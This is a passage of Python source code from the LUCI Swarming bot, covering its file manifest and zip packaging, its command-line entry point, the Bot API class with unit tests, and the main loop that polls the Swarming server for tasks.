    'third_party/pyasn1/pyasn1/codec/der/__init__.py',
    'third_party/pyasn1/pyasn1/codec/der/decoder.py',
    'third_party/pyasn1/pyasn1/codec/der/encoder.py',
    'third_party/pyasn1/pyasn1/compat/__init__.py',
    'third_party/pyasn1/pyasn1/compat/binary.py',
    'third_party/pyasn1/pyasn1/compat/octets.py',
    'third_party/pyasn1/pyasn1/debug.py',
    'third_party/pyasn1/pyasn1/error.py',
    'third_party/pyasn1/pyasn1/type/__init__.py',
    'third_party/pyasn1/pyasn1/type/base.py',
    'third_party/pyasn1/pyasn1/type/char.py',
    'third_party/pyasn1/pyasn1/type/constraint.py',
    'third_party/pyasn1/pyasn1/type/error.py',
    'third_party/pyasn1/pyasn1/type/namedtype.py',
    'third_party/pyasn1/pyasn1/type/namedval.py',
    'third_party/pyasn1/pyasn1/type/tag.py',
    'third_party/pyasn1/pyasn1/type/tagmap.py',
    'third_party/pyasn1/pyasn1/type/univ.py',
    'third_party/pyasn1/pyasn1/type/useful.py',
    'third_party/requests/__init__.py',
    'third_party/requests/adapters.py',
    'third_party/requests/api.py',
    'third_party/requests/auth.py',
    'third_party/requests/certs.py',
    'third_party/requests/compat.py',
    'third_party/requests/cookies.py',
    'third_party/requests/exceptions.py',
    'third_party/requests/hooks.py',
    'third_party/requests/models.py',
    'third_party/requests/packages/__init__.py',
    'third_party/requests/packages/urllib3/__init__.py',
    'third_party/requests/packages/urllib3/_collections.py',
    'third_party/requests/packages/urllib3/connection.py',
    'third_party/requests/packages/urllib3/connectionpool.py',
    'third_party/requests/packages/urllib3/contrib/__init__.py',
    'third_party/requests/packages/urllib3/contrib/ntlmpool.py',
    'third_party/requests/packages/urllib3/contrib/pyopenssl.py',
    'third_party/requests/packages/urllib3/exceptions.py',
    'third_party/requests/packages/urllib3/fields.py',
    'third_party/requests/packages/urllib3/filepost.py',
    'third_party/requests/packages/urllib3/packages/__init__.py',
    'third_party/requests/packages/urllib3/packages/ordered_dict.py',
    'third_party/requests/packages/urllib3/packages/six.py',
    'third_party/requests/packages/urllib3/packages/ssl_match_hostname/'
        '__init__.py',
    'third_party/requests/packages/urllib3/packages/ssl_match_hostname/'
        '_implementation.py',
    'third_party/requests/packages/urllib3/poolmanager.py',
    'third_party/requests/packages/urllib3/request.py',
    'third_party/requests/packages/urllib3/response.py',
    'third_party/requests/packages/urllib3/util/__init__.py',
    'third_party/requests/packages/urllib3/util/connection.py',
    'third_party/requests/packages/urllib3/util/request.py',
    'third_party/requests/packages/urllib3/util/response.py',
    'third_party/requests/packages/urllib3/util/retry.py',
    'third_party/requests/packages/urllib3/util/ssl_.py',
    'third_party/requests/packages/urllib3/util/timeout.py',
    'third_party/requests/packages/urllib3/util/url.py',
    'third_party/requests/sessions.py',
    'third_party/requests/status_codes.py',
    'third_party/requests/structures.py',
    'third_party/requests/utils.py',
    'third_party/rsa/rsa/__init__.py',
    'third_party/rsa/rsa/_compat.py',
    'third_party/rsa/rsa/_version133.py',
    'third_party/rsa/rsa/_version200.py',
    'third_party/rsa/rsa/asn1.py',
    'third_party/rsa/rsa/bigfile.py',
    'third_party/rsa/rsa/cli.py',
    'third_party/rsa/rsa/common.py',
    'third_party/rsa/rsa/core.py',
    'third_party/rsa/rsa/key.py',
    'third_party/rsa/rsa/parallel.py',
    'third_party/rsa/rsa/pem.py',
    'third_party/rsa/rsa/pkcs1.py',
    'third_party/rsa/rsa/prime.py',
    'third_party/rsa/rsa/randnum.py',
    'third_party/rsa/rsa/transform.py',
    'third_party/rsa/rsa/util.py',
    'third_party/rsa/rsa/varblock.py',
    'third_party/six/__init__.py',
    'utils/__init__.py',
    'utils/cacert.pem',
    'utils/file_path.py',
    'utils/fs.py',
    'utils/large.py',
    'utils/logging_utils.py',
    'utils/lru.py',
    'utils/net.py',
    'utils/oauth.py',
    'utils/on_error.py',
    'utils/subprocess42.py',
    'utils/threading_utils.py',
    'utils/tools.py',
    'utils/zip_package.py',
    'adb/__init__.py',
    'adb/adb_commands.py',
    'adb/adb_protocol.py',
    'adb/common.py',
    'adb/contrib/__init__.py',
    'adb/contrib/adb_commands_safe.py',
    'adb/contrib/high.py',
    'adb/contrib/parallel.py',
    'adb/fastboot.py',
    'adb/filesync_protocol.py',
    'adb/sign_pythonrsa.py',
    'adb/usb_exceptions.py',
    'python_libusb1/__init__.py',
    'python_libusb1/libusb1.py',
    'python_libusb1/usb1.py',
)


def is_windows():
  """"""Returns True if this code is running under Windows.""""""
  return os.__file__[0] != '/'


def resolve_symlink(path):
  """"""Processes path containing symlink on Windows.

  This is needed to make ../swarming_bot/main_test.py pass on Windows because
  git on Windows renders symlinks as normal files.
  """"""
  if not is_windows():
    # Only does this dance on Windows.
    return path
  parts = os.path.normpath(path).split(os.path.sep)
  for i in xrange(2, len(parts)):
    partial = os.path.sep.join(parts[:i])
    if os.path.isfile(partial):
      with open(partial) as f:
        link = f.read()
      assert '\n' not in link and link, link
      parts[i-1] = link
  return os.path.normpath(os.path.sep.join(parts))


def yield_swarming_bot_files(root_dir, host, host_version, additionals):
  """"""Yields all the files to map as tuple(filename, content).

  config.json is injected with json data about the server.

  This function guarantees that the output is sorted by filename.
  """"""
  items = {i: None for i in FILES}
  items.update(additionals)
  config = {
    'server': host.rstrip('/'),
    'server_version': host_version,
  }
  items['config/config.json'] = json.dumps(config)
  for item, content in sorted(items.iteritems()):
    if content is not None:
      yield item, content
    else:
      with open(resolve_symlink(os.path.join(root_dir, item)), 'rb') as f:
        yield item, f.read()


def get_swarming_bot_zip(root_dir, host, host_version, additionals):
  """"""Returns a zipped file of all the files a bot needs to run.

  Arguments:
    root_dir: directory swarming_bot.
    additionals: dict(filepath: content) of additional items to put into the zip
        file, in addition to FILES and MAPPED. In practice, it's going to be a
        custom bot_config.py.
  Returns:
    Tuple(str being the zipped file's content, bot version (SHA-1) it
    represents).
  """"""
  zip_memory_file = StringIO.StringIO()
  h = hashlib.sha1()
  with zipfile.ZipFile(zip_memory_file, 'w', zipfile.ZIP_DEFLATED) as zip_file:
    for name, content in yield_swarming_bot_files(
        root_dir, host, host_version, additionals):
      zip_file.writestr(name, content)
      h.update(str(len(name)))
      h.update(name)
      h.update(str(len(content)))
      h.update(content)

  data = zip_memory_file.getvalue()
  bot_version = h.hexdigest()
  logging.info(
      'get_swarming_bot_zip(%s) is %d bytes; %s',
      additionals.keys(), len(data), bot_version)
  return data, bot_version


def get_swarming_bot_version(root_dir, host, host_version, additionals):
  """"""Returns the SHA1 hash of the bot code, representing the version.

  Arguments:
    root_dir: directory swarming_bot.
    additionals: See get_swarming_bot_zip's doc.

  Returns:
    The SHA1 hash of the bot code.
  """"""
  h = hashlib.sha1()
  try:
    # TODO(maruel): Deduplicate from zip_package.genereate_version().
    for name, content in yield_swarming_bot_files(
        root_dir, host, host_version, additionals):
      h.update(str(len(name)))
      h.update(name)
      h.update(str(len(content)))
      h.update(content)
  except IOError:
    logging.warning('Missing expected file. Hash will be invalid.')
  bot_version = h.hexdigest()
  logging.info(
      'get_swarming_bot_version(%s) = %s', sorted(additionals), bot_version)
  return bot_version
/n/n/nappengine/swarming/swarming_bot/__main__.py/n/n# Copyright 2014 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

""""""Runs either task_runner.py, bot_main.py or bot_config.py.

The imports are done late so if an ImportError occurs, it is localized to this
command only.
""""""

import code
import json
import logging
import os
import optparse
import shutil
import sys
import zipfile

# That's from ../../../client/
from third_party.depot_tools import fix_encoding
from utils import logging_utils
from utils import zip_package

# This file can only be run as a zip.
THIS_FILE = os.path.abspath(zip_package.get_main_script_path())


# libusb1 expects to be directly in sys.path.
sys.path.insert(0, os.path.join(THIS_FILE, 'python_libusb1'))

# Copied from //client/utils/oauth.py.
sys.path.insert(0, os.path.join(THIS_FILE, 'third_party'))
sys.path.insert(0, os.path.join(THIS_FILE, 'third_party', 'pyasn1'))
sys.path.insert(0, os.path.join(THIS_FILE, 'third_party', 'rsa'))

from bot_code import common


# TODO(maruel): Use depot_tools/subcommand.py. The goal here is to have all the
# sub commands packed into the single .zip file as a swiss army knife (think
# busybox but worse).


def CMDattributes(_args):
  """"""Prints out the bot's attributes.""""""
  from bot_code import bot_main
  json.dump(
      bot_main.get_attributes(bot_main.get_bot()), sys.stdout, indent=2,
      sort_keys=True, separators=(',', ': '))
  print('')
  return 0


def CMDconfig(_args):
  """"""Prints the config.json embedded in this zip.""""""
  logging_utils.prepare_logging(None)
  from bot_code import bot_main
  json.dump(bot_main.get_config(), sys.stdout, indent=2, sort_keys=True)
  print('')
  return 0


def CMDis_fine(_args):
  """"""Just reports that the code doesn't throw.

  That ensures that the bot has minimal viability before transfering control to
  it. For now, it just imports bot_main but later it'll check the config, etc.
  """"""
  # pylint: disable=unused-variable
  from bot_code import bot_main
  from config import bot_config
  # We're #goodenough.
  return 0


def CMDrestart(_args):
  """"""Utility subcommand that hides the difference between each OS to reboot
  the host.""""""
  logging_utils.prepare_logging(None)
  import os_utilities
  # This function doesn't return.
  os_utilities.restart()
  # Should never reach here.
  return 1


def CMDrun_isolated(args):
  """"""Internal command to run an isolated command.""""""
  sys.path.insert(0, os.path.join(THIS_FILE, 'client'))
  # run_isolated setups logging by itself.
  import run_isolated
  return run_isolated.main(args)


def CMDsetup(_args):
  """"""Setup the bot to auto-start but doesn't start the bot.""""""
  logging_utils.prepare_logging(os.path.join('logs', 'bot_config.log'))
  from bot_code import bot_main
  bot_main.setup_bot(True)
  return 0


def CMDserver(_args):
  """"""Prints the server url. It's like 'config' but easier to parse.""""""
  logging_utils.prepare_logging(None)
  from bot_code import bot_main
  print bot_main.get_config()['server']
  return 0


def CMDshell(args):
  """"""Starts a shell with api.* in..""""""
  logging_utils.prepare_logging(None)
  logging_utils.set_console_level(logging.DEBUG)

  from bot_code import bot_main
  from api import os_utilities
  from api import platforms
  local_vars = {
    'bot_main': bot_main,
    'json': json,
    'os_utilities': os_utilities,
    'platforms': platforms,
  }
  # Can't use: from api.platforms import *
  local_vars.update(
      (k, v) for k, v in platforms.__dict__.iteritems()
      if not k.startswith('_'))

  if args:
    for arg in args:
      exec code.compile_command(arg) in local_vars
  else:
    code.interact(
        'Locals:\n  ' + '\n  '.join( sorted(local_vars)), None, local_vars)
  return 0


def CMDstart_bot(args):
  """"""Starts the swarming bot.""""""
  logging_utils.prepare_logging(os.path.join('logs', 'swarming_bot.log'))
  logging.info(
      'importing bot_main: %s, %s', THIS_FILE, zip_package.generate_version())
  from bot_code import bot_main
  result = bot_main.main(args)
  logging.info('bot_main exit code: %d', result)
  return result


def CMDstart_slave(args):
  """"""Ill named command that actually sets up the bot then start it.""""""
  # TODO(maruel): Rename function.
  logging_utils.prepare_logging(os.path.join('logs', 'bot_config.log'))

  parser = optparse.OptionParser()
  parser.add_option(
      '--survive', action='store_true',
      help='Do not reboot the host even if bot_config.setup_bot() asked to')
  options, args = parser.parse_args(args)

  try:
    from bot_code import bot_main
    bot_main.setup_bot(options.survive)
  except Exception:
    logging.exception('bot_main.py failed.')

  logging.info('Starting the bot: %s', THIS_FILE)
  return common.exec_python([THIS_FILE, 'start_bot'])


def CMDtask_runner(args):
  """"""Internal command to run a swarming task.""""""
  logging_utils.prepare_logging(os.path.join('logs', 'task_runner.log'))
  from bot_code import task_runner
  return task_runner.main(args)


def CMDversion(_args):
  """"""Prints the version of this file and the hash of the code.""""""
  logging_utils.prepare_logging(None)
  print zip_package.generate_version()
  return 0


def main():
  if os.getenv('CHROME_REMOTE_DESKTOP_SESSION') == '1':
    # Disable itself when run under Google Chrome Remote Desktop, as it's
    # normally started at the console and starting up via Remote Desktop would
    # cause multiple bots to run concurrently on the host.
    print >> sys.stderr, (
        'Inhibiting Swarming bot under Google Chrome Remote Desktop.')
    return 0

  # Always make the current working directory the directory containing this
  # file. It simplifies assumptions.
  os.chdir(os.path.dirname(THIS_FILE))
  # Always create the logs dir first thing, before printing anything out.
  if not os.path.isdir('logs'):
    os.mkdir('logs')

  # This is necessary so os.path.join() works with unicode path. No kidding.
  # This must be done here as each of the command take wildly different code
  # path and this must be run in every case, as it causes really unexpected
  # issues otherwise, especially in module os.path.
  fix_encoding.fix_encoding()

  if os.path.basename(THIS_FILE) == 'swarming_bot.zip':
    # Self-replicate itself right away as swarming_bot.1.zip and restart as it.
    print >> sys.stderr, 'Self replicating pid:%d.' % os.getpid()
    if os.path.isfile('swarming_bot.1.zip'):
      os.remove('swarming_bot.1.zip')
    shutil.copyfile('swarming_bot.zip', 'swarming_bot.1.zip')
    cmd = ['swarming_bot.1.zip'] + sys.argv[1:]
    print >> sys.stderr, 'cmd: %s' % cmd
    return common.exec_python(cmd)

  # sys.argv[0] is the zip file itself.
  cmd = 'start_slave'
  args = []
  if len(sys.argv) > 1:
    cmd = sys.argv[1]
    args = sys.argv[2:]

  fn = getattr(sys.modules[__name__], 'CMD%s' % cmd, None)
  if fn:
    try:
      return fn(args)
    except ImportError:
      logging.exception('Failed to run %s', cmd)
      with zipfile.ZipFile(THIS_FILE, 'r') as f:
        logging.error('Files in %s:\n%s', THIS_FILE, f.namelist())
      return 1

  print >> sys.stderr, 'Unknown command %s' % cmd
  return 1


if __name__ == '__main__':
  sys.exit(main())
/n/n/nappengine/swarming/swarming_bot/api/bot.py/n/n# Copyright 2014 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

""""""Bot interface used in bot_config.py.""""""

import logging
import os
import threading
import time

import os_utilities
from utils import net
from utils import zip_package

THIS_FILE = os.path.abspath(zip_package.get_main_script_path())

# Method could be a function - pylint: disable=R0201


class Bot(object):
  def __init__(
      self, attributes, server, server_version, base_dir, shutdown_hook):
    # Do not expose attributes  for now, as attributes may be refactored.
    assert server is None or not server.endswith('/'), server
    self._attributes = attributes
    self._base_dir = base_dir
    self._server = server
    self._server_version = server_version
    self._shutdown_hook = shutdown_hook
    self._timers = []
    self._timers_dying = False
    self._timers_lock = threading.Lock()

  @property
  def base_dir(self):
    """"""Returns the working directory.

    It is normally the current workind directory, e.g. os.getcwd() but it is
    preferable to not assume that.
    """"""
    return self._base_dir

  @property
  def dimensions(self):
    """"""The bot's current dimensions.

    Dimensions are relatively static and not expected to change much. They
    should change only when it effectively affects the bot's capacity to execute
    tasks.
    """"""
    return self._attributes.get('dimensions', {}).copy()

  @property
  def id(self):
    """"""Returns the bot's ID.""""""
    return self.dimensions.get('id', ['unknown'])[0]

  @property
  def server(self):
    """"""URL of the swarming server this bot is connected to.

    It includes the https:// prefix but without trailing /, so it looks like
    ""https://foo-bar.appspot.com"".
    """"""
    return self._server

  @property
  def server_version(self):
    """"""Version of the server's implementation.

    The form is nnn-hhhhhhh for pristine version and nnn-hhhhhhh-tainted-uuuu
    for non-upstreamed code base:
      nnn: revision pseudo number
      hhhhhhh: git commit hash
      uuuu: username
    """"""
    return self._server_version

  @property
  def state(self):
    return self._attributes['state']

  @property
  def swarming_bot_zip(self):
    """"""Absolute path to the swarming_bot.zip file.

    The bot itself is run as swarming_bot.1.zip or swarming_bot.2.zip. Always
    return swarming_bot.zip since this is the script that must be used when
    starting up.
    """"""
    return os.path.join(os.path.dirname(THIS_FILE), 'swarming_bot.zip')

  def post_event(self, event_type, message):
    """"""Posts an event to the server.""""""
    data = self._attributes.copy()
    data['event'] = event_type
    data['message'] = message
    net.url_read_json(self.server + '/swarming/api/v1/bot/event', data=data)

  def post_error(self, message):
    """"""Posts given string as a failure.

    This is used in case of internal code error. It traps exception.
    """"""
    logging.error('Error: %s\n%s', self._attributes, message)
    try:
      self.post_event('bot_error', message)
    except Exception:
      logging.exception('post_error(%s) failed.', message)

  def restart(self, message):
    """"""Reboots the machine.

    If the reboot is successful, never returns: the process should just be
    killed by OS.

    If reboot fails, logs the error to the server and moves the bot to
    quarantined mode.
    """"""
    self.post_event('bot_rebooting', message)
    self.cancel_all_timers()
    if self._shutdown_hook:
      try:
        self._shutdown_hook(self)
      except Exception as e:
        logging.exception('shutdown hook failed: %s', e)
    # os_utilities.restart should never return, unless restart is not happening.
    # If restart is taking longer than N minutes, it probably not going to
    # finish at all. Report this to the server.
    try:
      os_utilities.restart(message, timeout=15*60)
    except LookupError:
      # This is a special case where OSX is deeply hosed. In that case the disk
      # is likely in read-only mode and there isn't much that can be done. This
      # exception is deep inside pickle.py. So notify the server then hang in
      # there.
      self.post_error('This host partition is bad; please fix the host')
      while True:
        time.sleep(1)
    self.post_error('Bot is stuck restarting for: %s' % message)

  def call_later(self, delay_sec, callback):
    """"""Schedules a function to be called later (if bot is still running).

    All calls are executed in a separate internal thread, be careful with what
    you call from there (Bot object is generally not thread safe).

    Multiple callbacks can be executed concurrently. It is safe to call
    'call_later' from the callback.
    """"""
    timer = None

    def call_wrapper():
      with self._timers_lock:
        # Canceled already?
        if timer not in self._timers:
          return
        self._timers.remove(timer)
      try:
        callback()
      except Exception:
        logging.exception('Timer callback failed')

    with self._timers_lock:
      if not self._timers_dying:
        timer = threading.Timer(delay_sec, call_wrapper)
        self._timers.append(timer)
        timer.daemon = True
        timer.start()

  def cancel_all_timers(self):
    """"""Cancels all pending 'call_later' calls and forbids adding new ones.""""""
    timers = None
    with self._timers_lock:
      self._timers_dying = True
      for t in self._timers:
        t.cancel()
      timers, self._timers = self._timers, []
    for t in timers:
      t.join(timeout=5)
      if t.isAlive():
        logging.error('Timer thread did not terminate fast enough: %s', t)

  def update_dimensions(self, new_dimensions):
    """"""Called internally to update Bot.dimensions.""""""
    self._attributes['dimensions'] = new_dimensions

  def update_state(self, new_state):
    """"""Called internally to update Bot.state.""""""
    self._attributes['state'] = new_state
/n/n/nappengine/swarming/swarming_bot/api/bot_test.py/n/n#!/usr/bin/env python
# Copyright 2014 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

import os
import sys
import unittest
import threading

THIS_FILE = os.path.abspath(__file__)

import test_env_api
test_env_api.setup_test_env()

import bot


class TestBot(unittest.TestCase):
  def test_bot(self):
    obj = bot.Bot(
        {'dimensions': {'foo': 'bar'}},
        'https://localhost:1',
        '1234-1a2b3c4-tainted-joe',
        'base_dir',
        None)
    self.assertEqual({'foo': 'bar'}, obj.dimensions)
    self.assertEqual(
        os.path.join(os.path.dirname(THIS_FILE), 'swarming_bot.zip'),
        obj.swarming_bot_zip)
    self.assertEqual('1234-1a2b3c4-tainted-joe', obj.server_version)
    self.assertEqual('base_dir', obj.base_dir)

  def test_bot_call_later(self):
    obj = bot.Bot({}, 'https://localhost:1', '1234-1a2b3c4-tainted-joe',
                  'base_dir', None)
    ev = threading.Event()
    obj.call_later(0.001, ev.set)
    self.assertTrue(ev.wait(1))

  def test_bot_call_later_cancel(self):
    obj = bot.Bot({}, 'https://localhost:1', '1234-1a2b3c4-tainted-joe',
                  'base_dir', None)
    ev = threading.Event()
    obj.call_later(0.1, ev.set)
    obj.cancel_all_timers()
    self.assertFalse(ev.wait(0.3))


if __name__ == '__main__':
  if '-v' in sys.argv:
    unittest.TestCase.maxDiff = None
  unittest.main()
/n/n/nappengine/swarming/swarming_bot/bot_code/bot_main.py/n/n# Copyright 2013 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

""""""Swarming bot main process.

This is the program that communicates with the Swarming server, ensures the code
is always up to date and executes a child process to run tasks and upload
results back.

It manages self-update and rebooting the host in case of problems.

Set the environment variable SWARMING_LOAD_TEST=1 to disable the use of
server-provided bot_config.py. This permits safe load testing.
""""""

import contextlib
import json
import logging
import optparse
import os
import shutil
import signal
import sys
import tempfile
import threading
import time
import traceback
import zipfile

import common
import singleton
from api import bot
from api import os_utilities
from utils import file_path
from utils import net
from utils import on_error
from utils import subprocess42
from utils import zip_package


# Used to opportunistically set the error handler to notify the server when the
# process exits due to an exception.
_ERROR_HANDLER_WAS_REGISTERED = False


# Set to the zip's name containing this file. This is set to the absolute path
# to swarming_bot.zip when run as part of swarming_bot.zip. This value is
# overriden in unit tests.
THIS_FILE = os.path.abspath(zip_package.get_main_script_path())


# The singleton, initially unset.
SINGLETON = singleton.Singleton(os.path.dirname(THIS_FILE))


### bot_config handler part.


def _in_load_test_mode():
  """"""Returns True if the default values should be used instead of the server
  provided bot_config.py.

  This also disables server telling the bot to restart.
  """"""
  return os.environ.get('SWARMING_LOAD_TEST') == '1'


def get_dimensions(botobj):
  """"""Returns bot_config.py's get_attributes() dict.""""""
  # Importing this administrator provided script could have side-effects on
  # startup. That is why it is imported late.
  try:
    if _in_load_test_mode():
      # Returns a minimal set of dimensions so it doesn't run tasks by error.
      dimensions = os_utilities.get_dimensions()
      return {
        'id': dimensions['id'],
        'load_test': ['1'],
      }

    from config import bot_config
    out = bot_config.get_dimensions(botobj)
    if not isinstance(out, dict):
      raise ValueError('Unexpected type %s' % out.__class__)
    return out
  except Exception as e:
    logging.exception('get_dimensions() failed')
    try:
      out = os_utilities.get_dimensions()
      out['error'] = [str(e)]
      out['quarantined'] = ['1']
      return out
    except Exception as e:
      try:
        botid = os_utilities.get_hostname_short()
      except Exception as e2:
        botid = 'error_%s' % str(e2)
      return {
          'id': [botid],
          'error': ['%s\n%s' % (e, traceback.format_exc()[-2048:])],
          'quarantined': ['1'],
        }


def get_state(botobj, sleep_streak):
  """"""Returns dict with a state of the bot reported to the server with each poll.
  """"""
  try:
    if _in_load_test_mode():
      state = os_utilities.get_state()
      state['dimensions'] = os_utilities.get_dimensions()
    else:
      from config import bot_config
      state = bot_config.get_state(botobj)
      if not isinstance(state, dict):
        state = {'error': state}
  except Exception as e:
    logging.exception('get_state() failed')
    state = {
      'error': '%s\n%s' % (e, traceback.format_exc()[-2048:]),
      'quarantined': True,
    }

  state['sleep_streak'] = sleep_streak
  return state


def call_hook(botobj, name, *args):
  """"""Calls a hook function in bot_config.py.""""""
  try:
    if _in_load_test_mode():
      return

    logging.info('call_hook(%s)', name)
    from config import bot_config
    hook = getattr(bot_config, name, None)
    if hook:
      return hook(botobj, *args)
  except Exception as e:
    msg = '%s\n%s' % (e, traceback.format_exc()[-2048:])
    botobj.post_error('Failed to call hook %s(): %s' % (name, msg))


def setup_bot(skip_reboot):
  """"""Calls bot_config.setup_bot() to have the bot self-configure itself.

  Reboot the host if bot_config.setup_bot() returns False, unless skip_reboot is
  also true.
  """"""
  if _in_load_test_mode():
    return

  botobj = get_bot()
  try:
    from config import bot_config
  except Exception as e:
    msg = '%s\n%s' % (e, traceback.format_exc()[-2048:])
    botobj.post_error('bot_config.py is bad: %s' % msg)
    return

  try:
    should_continue = bot_config.setup_bot(botobj)
  except Exception as e:
    msg = '%s\n%s' % (e, traceback.format_exc()[-2048:])
    botobj.post_error('bot_config.setup_bot() threw: %s' % msg)
    return

  if not should_continue and not skip_reboot:
    botobj.restart('Starting new swarming bot: %s' % THIS_FILE)


### end of bot_config handler part.


def get_min_free_space():
  """"""Returns free disk space needed.

  Add a ""250 MiB slack space"" for logs, temporary files and whatever other leak.
  """"""
  return int((os_utilities.get_min_free_space(THIS_FILE) + 250.) * 1024 * 1024)


def generate_version():
  """"""Returns the bot's code version.""""""
  try:
    return zip_package.generate_version()
  except Exception as e:
    return 'Error: %s' % e


def get_attributes(botobj):
  """"""Returns the attributes sent to the server.

  Each called function catches all exceptions so the bot doesn't die on startup,
  which is annoying to recover. In that case, we set a special property to catch
  these and help the admin fix the swarming_bot code more quickly.

  Arguments:
  - botobj: bot.Bot instance or None
  """"""
  return {
    'dimensions': get_dimensions(botobj),
    'state': get_state(botobj, 0),
    'version': generate_version(),
  }


def post_error_task(botobj, error, task_id):
  """"""Posts given error as failure cause for the task.

  This is used in case of internal code error, and this causes the task to
  become BOT_DIED.

  Arguments:
    botobj: A bot.Bot instance.
    error: String representing the problem.
    task_id: Task that had an internal error. When the Swarming server sends
        commands to a bot, even though they could be completely wrong, the
        server assumes the job as running. Thus this function acts as the
        exception handler for incoming commands from the Swarming server. If for
        any reason the local test runner script can not be run successfully,
        this function is invoked.
  """"""
  logging.error('Error: %s', error)
  data = {
    'id': botobj.id,
    'message': error,
    'task_id': task_id,
  }
  return net.url_read_json(
      botobj.server + '/swarming/api/v1/bot/task_error/%s' % task_id, data=data)


def on_shutdown_hook(b):
  """"""Called when the bot is restarting.""""""
  call_hook(b, 'on_bot_shutdown')
  # Aggressively set itself up so we ensure the auto-reboot configuration is
  # fine before restarting the host. This is important as some tasks delete the
  # autorestart script (!)
  setup_bot(True)


def get_bot():
  """"""Returns a valid Bot instance.

  Should only be called once in the process lifetime.
  """"""
  # This variable is used to bootstrap the initial bot.Bot object, which then is
  # used to get the dimensions and state.
  attributes = {
    'dimensions': {u'id': ['none']},
    'state': {},
    'version': generate_version(),
  }
  config = get_config()
  assert not config['server'].endswith('/'), config

  # Create a temporary object to call the hooks.
  botobj = bot.Bot(
      attributes,
      config['server'],
      config['server_version'],
      os.path.dirname(THIS_FILE),
      on_shutdown_hook)
  return bot.Bot(
      get_attributes(botobj),
      config['server'],
      config['server_version'],
      os.path.dirname(THIS_FILE),
      on_shutdown_hook)


def clean_isolated_cache(botobj):
  """"""Asks run_isolated to clean its cache.

  This may take a while but it ensures that in the case of a run_isolated run
  failed and it temporarily used more space than min_free_disk, it can cleans up
  the mess properly.

  It will remove unexpected files, remove corrupted files, trim the cache size
  based on the policies and update state.json.
  """"""
  bot_dir = botobj.base_dir
  cmd = [
    sys.executable, THIS_FILE, 'run_isolated',
    '--clean',
    '--log-file', os.path.join(bot_dir, 'logs', 'run_isolated.log'),
    '--cache', os.path.join(bot_dir, 'cache'),
    '--min-free-space', str(get_min_free_space()),
  ]
  logging.info('Running: %s', cmd)
  try:
    # Intentionally do not use a timeout, it can take a while to hash 50gb but
    # better be safe than sorry.
    proc = subprocess42.Popen(
        cmd,
        stdin=subprocess42.PIPE,
        stdout=subprocess42.PIPE, stderr=subprocess42.STDOUT,
        cwd=bot_dir,
        detached=True,
        close_fds=sys.platform != 'win32')
    output, _ = proc.communicate(None)
    logging.info('Result:\n%s', output)
    if proc.returncode:
      botobj.post_error(
          'swarming_bot.zip failure during run_isolated --clean:\n%s' % output)
  except OSError:
    botobj.post_error(
        'swarming_bot.zip internal failure during run_isolated --clean')


def run_bot(arg_error):
  """"""Runs the bot until it reboots or self-update or a signal is received.

  When a signal is received, simply exit.
  """"""
  quit_bit = threading.Event()
  def handler(sig, _):
    logging.info('Got signal %s', sig)
    quit_bit.set()

  # TODO(maruel): Set quit_bit when stdin is closed on Windows.

  with subprocess42.set_signal_handler(subprocess42.STOP_SIGNALS, handler):
    config = get_config()
    try:
      # First thing is to get an arbitrary url. This also ensures the network is
      # up and running, which is necessary before trying to get the FQDN below.
      resp = net.url_read(config['server'] + '/swarming/api/v1/bot/server_ping')
      if resp is None:
        logging.error('No response from server_ping')
    except Exception as e:
      # url_read() already traps pretty much every exceptions. This except
      # clause is kept there ""just in case"".
      logging.exception('server_ping threw')

    if quit_bit.is_set():
      logging.info('Early quit 1')
      return 0

    # If this fails, there's hardly anything that can be done, the bot can't
    # even get to the point to be able to self-update.
    botobj = get_bot()
    resp = net.url_read_json(
        botobj.server + '/swarming/api/v1/bot/handshake',
        data=botobj._attributes)
    if not resp:
      logging.error('Failed to contact for handshake')
    else:
      logging.info('Connected to %s', resp.get('server_version'))
      if resp.get('bot_version') != botobj._attributes['version']:
        logging.warning(
            'Found out we\'ll need to update: server said %s; we\'re %s',
            resp.get('bot_version'), botobj._attributes['version'])

    if arg_error:
      botobj.post_error('Bootstrapping error: %s' % arg_error)

    if quit_bit.is_set():
      logging.info('Early quit 2')
      return 0

    clean_isolated_cache(botobj)

    call_hook(botobj, 'on_bot_startup')

    if quit_bit.is_set():
      logging.info('Early quit 3')
      return 0

    # This environment variable is accessible to the tasks executed by this bot.
    os.environ['SWARMING_BOT_ID'] = botobj.id.encode('utf-8')

    # Remove the 'work' directory if present, as not removing it may cause the
    # bot to stay quarantined and not be able to get out of this state.
    work_dir = os.path.join(botobj.base_dir, 'work')
    try:
      if os.path.isdir(work_dir):
        file_path.rmtree(work_dir)
    except Exception as e:
      botobj.post_error('Failed to remove work: %s' % e)

    consecutive_sleeps = 0
    while not quit_bit.is_set():
      try:
        botobj.update_dimensions(get_dimensions(botobj))
        botobj.update_state(get_state(botobj, consecutive_sleeps))
        did_something = poll_server(botobj, quit_bit)
        if did_something:
          consecutive_sleeps = 0
        else:
          consecutive_sleeps += 1
      except Exception as e:
        logging.exception('poll_server failed')
        msg = '%s\n%s' % (e, traceback.format_exc()[-2048:])
        botobj.post_error(msg)
        consecutive_sleeps = 0
    logging.info('Quitting')

  # Tell the server we are going away.
  botobj.post_event('bot_shutdown', 'Signal was received')
  botobj.cancel_all_timers()
  return 0


def poll_server(botobj, quit_bit):
  """"""Polls the server to run one loop.

  Returns True if executed some action, False if server asked the bot to sleep.
  """"""
  # Access to a protected member _XXX of a client class - pylint: disable=W0212
  start = time.time()
  resp = net.url_read_json(
     botobj.server + '/swarming/api/v1/bot/poll', data=botobj._attributes)
  if not resp:
    return False
  logging.debug('Server response:\n%s', resp)

  cmd = resp['cmd']
  if cmd == 'sleep':
    quit_bit.wait(resp['duration'])
    return False

  if cmd == 'terminate':
    quit_bit.set()
    # This is similar to post_update() in task_runner.py.
    params = {
      'cost_usd': 0,
      'duration': 0,
      'exit_code': 0,
      'hard_timeout': False,
      'id': botobj.id,
      'io_timeout': False,
      'output': '',
      'output_chunk_start': 0,
      'task_id': resp['task_id'],
    }
    net.url_read_json(
        botobj.server + '/swarming/api/v1/bot/task_update/%s' % resp['task_id'],
        data=params)
    return False

  if cmd == 'run':
    if run_manifest(botobj, resp['manifest'], start):
      # Completed a task successfully so update swarming_bot.zip if necessary.
